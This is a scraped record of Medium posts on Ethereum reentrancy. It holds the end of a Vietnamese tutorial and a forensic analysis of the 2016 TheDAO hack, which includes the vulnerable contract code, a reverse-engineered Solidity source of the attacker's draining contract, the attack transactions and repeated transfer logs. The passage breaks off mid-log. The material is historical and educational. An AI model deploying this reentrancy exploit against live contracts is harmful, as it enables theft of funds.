\u0111\u1ec3 m\u00ecnh g\u1eedi ti\u1ec1n v\u00f4 \ud83c\udfe6( \ud83d\ude4e \u27a1\ufe0f \ud83c\udd71\ufe0f \u27a1\ufe0f \ud83c\udfe6).function () payable {    count++;    if (count < 3) {      v.withdraw();    }   }\u0110\u00e2y l\u00e0 fallback function c\u1ee7a \ud83c\udd71\ufe0f. \u1ede \u0111\u00e2y m\u00ecnh r\u00fat 3\ufe0f\u20e3 l\u1ea7n th\u00ec d\u1eebng.function attack() {    v.withdraw();  }Cu\u1ed1i c\u00f9ng l\u00e0 ph\u01b0\u01a1ng th\u1ee9c \u0111\u1ec3 trigger \ud83d\udc1eFIX \ud83d\udc1eS\u1eed d\u1ee5ng transfer() ho\u1eb7c send() thay th\u1ebf cho call() .\u0110\u1eb7t _balanceOf[msg.sender] = 0 tr\u01b0\u1edbc msg.sender.call.value(x)() .ConclusionB\u00e0i vi\u1ebft n\u00e0y l\u00e0 theo nh\u1eefng g\u00ec m\u00ecnh hi\u1ec3u. B\u00e0i vi\u1ebft c\u00f2n nhi\u1ec1u thi\u1ebfu s\u00f3t mong m\u1ecdi ng\u01b0\u1eddi \u0111\u00f3ng \u00fd ki\u1ebfn \u0111\u1ec3 b\u00e0i vi\u1ebft t\u1ed1t h\u01a1n. C\u00e1m \u01a1n m\u1ecdi ng\u01b0\u1eddi \u0111\u00e3 d\u00e0nh th\u1eddi gian \u0111\u1ec3 \u0111\u1ecdc \ud83d\ude3aReferencedReentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack\u2026To code smart contracts is certainly not a free picnic. A bug introduced in the code cost money and most likely not\u2026medium.com\u201cReentrancy Attack\u201d on a Smart ContractBugs in Solidity are costly, putting yourself and many others at risk, so its important to take precautions when\u2026medium.comSmart Contract Security: Part 1 Reentrancy AttacksEthereum is one of the two largest cryptocurrencies right now, with a market cap of more than 60B dollars, processing\u2026hackernoon.comKnown Attacks - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.io", "responses": 3, "tags": ["Application Security", "Smart Contracts", "Blockchain", "Cryptography"]}, {"title": "Smart Contract Reentrancy: TheDAO", "post_link": "https://medium.com/@zhongqiangc/smart-contract-reentrancy-thedao-f2da1d25180c?source=search_post", "author_name": "Zhongqiang Chen", "author_link": "https://medium.com/@zhongqiangc", "publish_date": "2019-08-22", "last_modified_date": "2019-08-29", "readtime": "12.2", "claps": 0, "voters": 0, "content": "Smart Contract Reentrancy: TheDAOZhongqiang ChenFollowAug 22 \u00b7 13 min readOverview of TheDAOA decentralized autonomous organization (DAO) is an entity operated by rules encoded as a computer program, termed smart contract, that is transparent, controlled by shareholders and not influenced by a central government. All DAO\u2019s financial transaction records and program rules are maintained on a blockchain.The DAO project is just such a decentralized autonomous organization and was meant to operate like a venture capital fund for the crypto and decentralized space. The project was launched in May 2016 and its smart contract as well as all transactions can be found athttps://etherscan.io/address/0xbb9bc244d798123fde783fcc1c72d3bb8c189413When deploying the DAO contract, some initial values are provided to the contract, which can given below.DAO contract address:0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413constructor arguments000000000000000000000000da4a4626d3e16e094de3225a751aab7128e965260000000000000000000000004a574510c7014e4ae985403536074abe582adfc80000000000000000000000000000000000000000000000001bc16d674ec80000000000000000000000000000000000000000000000000a968163f0a57b4000000000000000000000000000000000000000000000000000000000000057495e100000000000000000000000000000000000000000000000000000000000000000Arg [0] : 000000000000000000000000da4a4626d3e16e094de3225a751aab7128e96526Arg [1] : 0000000000000000000000004a574510c7014e4ae985403536074abe582adfc8Arg [2] : 0000000000000000000000000000000000000000000000001bc16d674ec80000Arg [3] : 000000000000000000000000000000000000000000000a968163f0a57b400000Arg [4] : 0000000000000000000000000000000000000000000000000000000057495e10Arg [5] : 0000000000000000000000000000000000000000000000000000000000000000DAO constructor:function DAO(    address _curator,    DAO_Creator _daoCreator,    uint _proposalDeposit,    uint _minTokensToCreate,    uint _closingTime,    address _privateCreation)From the initial values, we can find addresses of the curator and the DAO creator along with other information.The deployed DAO contract allows its members (also called token holders in the contract) to propose new projects or vote on existing proposals. For instance, the following proposals are just two examples of many submitted projects. Each proposal is assigned an ID and has a recipient and a description along with many other information.PID  recipient                                   description59   0xb656b2a9c3b2416437a811e07466ca712f5a5b5a  lonely, so lonely64   0x547389052a8dc86365c46641b5184956ec22749d  0x54738 SplitThese two proposals actually act as the entry points for the attacker to start the attacks.Vulnerability of TheDAOWhen a function in a contract calls functions in an external contract, the latter can take over the control flow of the execution and make changes to the data or workflow in the former by calling back to functions in the caller. If a function in a contract could be called repeatedly by another contract before the first invocation of the function is finished, then the former contract is vulnerable to reentrancy and such an attack is called reentrancy attack.The DAO contract is susceptible to reentrancy attack, although such a vulnerability involves multiple functions. First, let\u2019s look at the splitDAO() function in the DAO contract.contract DAO is DAOInterface, Token, TokenCreation {    function splitDAO(        uint _proposalID,        address _newCurator    ) noEther onlyTokenholders returns (bool _success) {        Proposal p = proposals[_proposalID];        // Sanity check        if (now < p.votingDeadline  // has the voting deadline arrived?            //The request for a split expires XX days after the voting deadline            || now > p.votingDeadline + splitExecutionPeriod            // Does the new Curator address match?            || p.recipient != _newCurator            // Is it a new curator proposal?            || !p.newCurator            // Have you voted for this split?            || !p.votedYes[msg.sender]            // Did you already vote on another proposal?            || (blocked[msg.sender] != _proposalID && blocked[msg.sender] != 0) )  {            throw;        }        // If the new DAO doesn't exist yet, create the new DAO and store the        // current split data        if (address(p.splitData[0].newDAO) == 0) {            p.splitData[0].newDAO = createNewDAO(_newCurator);            // Call depth limit reached, etc.            if (address(p.splitData[0].newDAO) == 0)                throw;            // should never happen            if (this.balance < sumOfProposalDeposits)                throw;            p.splitData[0].splitBalance = actualBalance();            p.splitData[0].rewardToken = rewardToken[address(this)];            p.splitData[0].totalSupply = totalSupply;            p.proposalPassed = true;        }        // Move ether and assign new Tokens        uint fundsToBeMoved =            (balances[msg.sender] * p.splitData[0].splitBalance) /            p.splitData[0].totalSupply;        if (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false)            throw;        // Assign reward rights to new DAO        uint rewardTokenToBeMoved =            (balances[msg.sender] * p.splitData[0].rewardToken) / p.splitData[0].totalSupply;        uint paidOutToBeMoved = DAOpaidOut[address(this)] * rewardTokenToBeMoved /            rewardToken[address(this)];        rewardToken[address(p.splitData[0].newDAO)] += rewardTokenToBeMoved;        if (rewardToken[address(this)] < rewardTokenToBeMoved)            throw;        rewardToken[address(this)] -= rewardTokenToBeMoved;        DAOpaidOut[address(p.splitData[0].newDAO)] += paidOutToBeMoved;        if (DAOpaidOut[address(this)] < paidOutToBeMoved)            throw;        DAOpaidOut[address(this)] -= paidOutToBeMoved;        // Burn DAO Tokens        Transfer(msg.sender, 0, balances[msg.sender]);        withdrawRewardFor(msg.sender); // be nice, and get his rewards        totalSupply -= balances[msg.sender];        balances[msg.sender] = 0;        paidOut[msg.sender] = 0;        return true;    }}The main purpose of this function is to create a new DAO from the existing DAO and move certain amount of tokens to the child DAO. The child DAO is created by function createNewDAO(). Besides tokens, rewards are also computed and sent back to the caller, which is implemented in function withdrawRewardFor() given below.contract DAO is DAOInterface, Token, TokenCreation {    function withdrawRewardFor(address _account) noEther internal        returns (bool _success) {        if ((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply < paidOut[_account])            throw;        uint reward =            (balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account];        if (!rewardAccount.payOut(_account, reward))            throw;        paidOut[_account] += reward;        return true;    }}After determining the amount of reward, the function withdrawRewardFor() call payOut() in the rewardAccount, which is an object of contract ManagedAccount, to actually send rewards to the message sender. The payOut() function is depicted here.contract ManagedAccount is ManagedAccountInterface{    function payOut(address _recipient, uint _amount) returns (bool) {        if (msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))            throw;        if (_recipient.call.value(_amount)()) {            PayOut(_recipient, _amount);            return true;        } else {            return false;        }    }}It is clear that payOut() function uses call() to send Ethers to the recipient, and such a call will hand over the control of the execution flow to the recipient. If the recipient is malicious, the recipient could call back to the DAO contract, thus, a reentrance attack is formed.The attacker of the DAO indeed takes advantage of such a vulnerability.Source code of the AttackTo exploit the vulnerability of the DAO contract, the attacker created contracts and deployed them to the Ethereum blockchain. In fact, the attacker deployed two contracts and their addresses are as follows.contract addresses:0xF835A0247b0063C04EF22006eBe57c5F11977Cc40xC0ee9dB1a9E07cA63E4fF0d5FB6F86Bf68D47b89contract constructor arguments:000000000000000000000000bb9bc244d798123fde783fcc1c72d3bb8c189413It is clear that the parameter to the constructors of the malicious contracts is exactly the address of the DAO contract.By simply comparing the binary code of the two contracts, we can know that the content of the two contracts are exactly the same.To execute a contract, only the binary form of the contract is needed. As the attacker is the solely user of the malicious contracts deployed, thus, the application binary interface (i.e., abi file) of the contact can also be kept secret and there is no need to publish it.As a result, the source code as well as the ABI of the malicious contract is not available to the public, and the binary form of the contract is the only thing we have to analyze it.With the help of reverse engineering, we are able to convert the binary form of a contract back to the form in high level programming language such as solidity. The compilation of a contract from high level programming language such as Solidity into its binary form, however, loses information. For example, the names of all functions and variables are translated into locations in storage, memory, or stack. Moreover, information on inheritance or function boundaries is also lost during the compilation process. Finally, optimization used when compiling and extra code added by compiler such as default getters and transformation on data structures further make the reverse engineering extremely difficult.Despite all the loss of information, it is still possible to recover most of the information in the code and present it in high level programming language. After all, code in the form of high level programming language is more human friendlier than binary code or opcodes.The source code of the DAO attack is depicted as follows . Please note that I use the most up-to-date solidity compiler, which is definitely not the compiler when the DAO attack occurred. If you prefer to older versions of compilers, you need to modify the code a little bit, especially the parts related to interactions with other contracts (i.e., abi encoding and decoding).pragma solidity ^0.5.1;contract contract_f835 {    event NewOwner(address _addr);    event SetDAO(address _addr);    event Vote(uint256 _proposalID, bool _supportsProposal);    event SplitDAO(uint256 _proposalID, address _addr);    event Transfer(address _addr, uint256 _val);    // event digest does not match    //0xbab6859bc098da798dbdc4860f0fee7467d703dadd975799e8c258b46a37d3de    event NewDepth(uint256 _depth);    // event digest does not match    // 0xa6af7265d7ede5fbf0ee375956b52b362800d4f92e268809bef5fdf2a57924b8    event ConstructorFail(uint256, address, bytes);    // for public variables, getter functions are generated    // automatically by compiler    // slot 0x00    address public owner;    // slot 0x01    address public curator;    // slot 0x02    address public dao;    // slot 0x03    uint256 public counter;    // slot 0x04    uint256 public proposalID;    // slot 0x05    // does not match function digest 0x26f5a8c9    // if you like, use \"cecqaJ\", \"cEMcnS\", or \"vKCYuD\" because    // bytes4(keccak256(\"cecqaJ()\")) = 0x26f5a8c9    uint256 public depth;    // slot 0x06    address public next;    // slot 0x07    // does not match function digest 0x5970c915    // if you like, use \"bUPAoJ\" or \"rjhDmK\" because    // bytes4(keccak256(\"bUPAoJ()\")) = 0x5970c915    address public collector;    modifier onlyOwner() {        require(msg.sender == owner);        _;    }        constructor(address _addr) public payable {        owner = msg.sender;        dao = _addr;    }    // 0x13af4035    function setOwner(address _addr) public onlyOwner returns (bool) {        emit NewOwner(_addr);        owner = _addr;        return true;    }    // 0x625e847d    // does not match function digest    // if you like, use function name \"aDZAXD\" because    // bytes4(keccak256(\"aDZAXD()\")) = 0x625e847d    function splitDAO2() public payable onlyOwner returns (bool) {        counter = 1;        collector.call.value(address(this).balance)(\"\");        // function splitDAO() digest: 82661dc4        (bool success,) = dao.call(abi.encodeWithSelector(            0x82661dc4, proposalID, curator));        if (!success) {            revert();        }        return true;    }    // 0x6637b882    function setDao(address _addr) public onlyOwner returns (bool) {        dao = _addr;        emit SetDAO(_addr);            return true;    }    // 0x7f9f519f    // does not match function digest    // if you like, use \"setDJclvA\" because    // bytes4(keccak256(\"setDJclvA(uint256)\")) = 0x7f9f519f    function setDepth(uint256 _depth) public onlyOwner         returns (bool) {        depth = _depth;        emit NewDepth(_depth);        return true;    }    // 0xa9059cbb    function transfer(address _addr, uint256 _val) public onlyOwner        returns (bool) {        // function transfer() digest: a9059cbb        (bool success,) = dao.call(abi.encodeWithSelector(            0xa9059cbb, _addr, _val));        if(!success) {            revert();        }        emit Transfer(_addr, _val);        return true;    }    // 0xc4463c80    function splitDAO(uint256 _proposalID,        address _curator,        address _next,        uint256 _depth,        address _collector)        public payable onlyOwner        returns (bool) {        next = _next;        counter = 1;        curator = _curator;        proposalID = _proposalID;        depth = _depth;        collector = _collector;        collector.call.value(address(this).balance)(\"\");        // function splitDAO() digest: 82661dc4        // dao.splitDAO() is \"noEther\", so don't set value()        (bool success,) = dao.call(abi.encodeWithSelector(            0x82661dc4, proposalID, curator));        if (!success) {            revert();        }        emit SplitDAO(proposalID, next);                return true;    }    // 0xc9d27afe    function vote(uint256 _proposalID, bool _supportsProposal)        public payable onlyOwner        returns (bool) {        // function vote() digest: 0xc9d27afe        (bool success,) = dao.call(abi.encodeWithSelector(            0xc9d27afe, _proposalID, _supportsProposal));        if (!success) {            revert();        }        emit Vote(_proposalID, _supportsProposal);        return true;    }    function () external payable {        // check if caller is rewardAccount, a ManagedAccount        // function rewardAccount() digest: 0e708203        (bool success, bytes memory bys) = dao.call(            abi.encodeWithSelector(0x0e708203));        if(!success) {            revert();        }        address account;        assembly {            account := mload(add(bys, 0x20))        }        if (account != msg.sender) {            // note: the misspelled word \"constuctor\"            emit ConstructorFail(0x40, msg.sender,                 'constuctor fail');            return;        }        // caller indeed comes from rewardAccount        if (counter > (depth - 1)) {            // reach maximum number of reentries            // function balanceOf() digest: 70a08231            (success, bys) = dao.call(abi.encodeWithSelector(                0x70a08231, address(this)));            if(!success) {                revert();            }            uint256 bal;            assembly {                bal := mload(add(bys, 0x20))            }            // function transfer() digest: a9059cbb            (success,) = dao.call(abi.encodeWithSelector(                0xa9059cbb, next, bal));            if(!success) {                revert();            }            counter = 1;            return;        }        // not hit maximum number of reentries yet        counter += 1;                // function splitDAO() digest: 82661dc4        (success,) = dao.call(abi.encodeWithSelector(            0x82661dc4, proposalID, curator));        if(!success) {            revert();        }        return;    }}It can be observed that the attack code is well designed and organized.First, the code only implements the functions that are absolutely necessary for the attack. In this regard, functions for voting on proposals, transferring tokens, and exploiting vulnerability are implemented. Also, the code only provides APIs to set new owner, DAO contract address, and maximum number of reentries, but not for other variables such as proposal ID and curator. It is clear from the DAO implementation that those new DAOs split from the original DAO share exactly the same piece of code, implying that all generations of DAOs are susceptible to the same reentrancy attack. To attack any newly generated DAO, it is as easy as pointing the malicious code to the new DAO by calling the APIs.Next, a launch pad (or attack platform) needs to be built in order to launch attacks. The attack platform including initialization of variables only needs sep up once, and after that, continuous attacks can be fired. Thus, the code provides two different attack venues: a heavy weight and a light weight. In the heavy weight attack venue, that is function splitDAO(), all variables related to the attack, such as proposalID, curator, and maximum number of reentrancy, should be provided. On the contrary, in the light weight attack venue, that is function splitDAO2(), no variable is needed.Finally, to make the attacks more efficient, the code is designed to use two (or more) contracts to coordinate the attacks. More specifically, variable \u201cnext\u201d of the code is used to store the address of another contract that executes the same piece of malicious code. At the end of each round of attack, all tokens drained by the current contract will be transferred to this \u201cnext\u201d contract to avoid being emptied out, at the meanwhile, this also makes it possible for the \u201cnext\u201d contract to launch the next round of attack.Please note that some function names and event names are not the same as their original names in the attacker\u2019s code as their digests do not match those given in the binary code. For detailed information, please refer to the source code presented above.Launch the AttackAs pointed out in the previous section, two malicious contracts are deployed in order to launch attacks. As the behavior of these two contracts are similar, so let\u2019s focus on the contract whose address starts with F835.First, the attacker uses the heavy weight venue to launch the attack.step 1. vote on a proposal by calling function:vote(uint256 _proposalID, bool _supportsProposal)Transaction Hash:0xb5ff2d7a165baba4ca8d7bf8223af9dcf956ec6a4f4f85dbdd3ebea0111251edfunction arguments:MethodID: 0xc9d27afe[0]:  000000000000000000000000000000000000000000000000000000000000003b[1]:  0000000000000000000000000000000000000000000000000000000000000001step 2. transfer tokens by calling function:transfer(address _to, uint256 _value)Transaction Hash:0xea48232a5c0e0721e27842fb88fb9d102ff2f8a2833b13f284ea3ce431ecc0a6function arguments:MethodID: 0xa9059cbb[0]:  000000000000000000000000c0ee9db1a9e07ca63e4ff0d5fb6f86bf68d47b89[1]:  00000000000000000000000000000000000000000000000dfd3f956d86e77600step 3. launch an attack with heavy weight venue:function splitDAO(uint256 _proposalID,    address _curator,    address _next,    uint256 _depth,    address _collector)Transaction Hash:0xecbdaf337c91c3b4ece2bfbd5fd1dee159dbe0bfbe528222c6e4f8e6149532a7function arguments:MethodID: c4463c80000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000b656b2a9c3b2416437a811e07466ca712f5a5b5a000000000000000000000000c0ee9db1a9e07ca63e4ff0d5fb6f86bf68d47b890000000000000000000000000000000000000000000000000000000000000009000000000000000000000000969837498944ae1dc0dcac2d0c65634c88729b2dThe results of the attack executed in step 3 are as follows.Transaction Hash:0xecbdaf337c91c3b4ece2bfbd5fd1dee159dbe0bfbe528222c6e4f8e6149532a7Block: 1718499 6652695 Block ConfirmationsTimestamp: 1156 days 20 hrs ago (Jun-17-2016 03:34:58 AM +UTC)From: 0xf35e2cc8e6523d683ed44870f5b7cc785051a77dTo: Contract 0xf835a0247b0063c04ef22006ebe57c5f11977cc4TRANSFER  138.37072686999998 Ether From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4 To  0x969837498944ae1dc0dcac2d0c65634c88729b2dTRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490Tokens Transferred:(10 ERC-20 Transfers found)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($48,074.58)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($48,074.58)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($48,074.58)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($48,074.58)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($48,074.58)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($48,074.58)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($48,074.58)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($48,074.58)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($48,074.58)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0xc0ee9db1a9e07ca63e4ff0d5fb6f86bf68d47b89For 25,805.6141471 ($48,074.58)  TheDAO (TheDAO)Value: 138.37072686999998 Ether ($25,756.33)Transaction Fee: 0.026538775 Ether ($4.94)Gas Limit: 4,712,388Gas Used by Transaction: 1,061,551 (22.53%)Gas Price: 0.000000025 Ether (25 Gwei)Nonce Position 6 0It can seen that there are indeed 9 transactions that transfer Ethers from the DAO contract to the child DAO contract created by the attacker.Also, the gas limit for the transaction executing the attack is set to 4,712,388, but the attack only consumes 1,061,551 (22.53%), indicating that the maximum number of reentries can be much larger than 9 with the given gas limit.Therefore, the attacker increases the maximum number of reentries to 0x1d (29) before launch another attack using the light weight venue.step 1. adjust maximum number of reentries.function setDepth(uint256 _depth)Transaction Hash:0x2e7c1b39d3406de4b53a95711ec1f87ad6bf86e6da4783f9b34318b4a94fe107function arguments:MethodID: 7f9f519f000000000000000000000000000000000000000000000000000000000000001dstep 2. attack with light weight venue.function splitDAO2()Transaction Hash:0x43e328ef43c6f2dcce8025efbcbc280c89464fb2b34462653fa13ba5bab89496function arguments:MethodID: 0x625e847dClearly, when launching attacks by using the light weight venue, the attacker does not need to provide any information when calling the API. The results of this light weight attack venue are as follows.Transaction Hash:0x43e328ef43c6f2dcce8025efbcbc280c89464fb2b34462653fa13ba5bab89496Block: 1718508 6652958 Block ConfirmationsTimestamp: 1156 days 21 hrs ago (Jun-17-2016 03:35:47 AM +UTC)From: 0xf35e2cc8e6523d683ed44870f5b7cc785051a77dTo: Contract 0xf835a0247b0063c04ef22006ebe57c5f11977cc4TRANSFER  138.243226594429474179 Ether From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4 To  0x969837498944ae1dc0dcac2d0c65634c88729b2dTRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490TRANSFER  258.056564760381731336 Ether From 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 To  0x304a554a310c7e546dfe434669c62820b7d83490Tokens Transferred:(30 ERC-20 Transfers found)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 